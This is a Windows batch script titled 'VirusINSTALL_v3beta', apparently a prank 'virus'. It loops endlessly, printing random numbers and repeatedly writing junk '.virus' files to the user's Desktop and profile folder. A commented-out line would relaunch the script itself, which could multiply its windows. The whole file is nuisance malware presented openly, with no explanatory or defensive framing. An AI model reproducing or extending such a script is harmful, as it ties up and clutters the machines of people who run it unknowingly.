@echo off
title VirusINSTALL_v3beta
color CA
set filename=%random%
:loop
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>"%userprofile%\Desktop\%filename%.virus"
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>"%userprofile%\%filename%.virus_binary"
::start "%0"
goto loop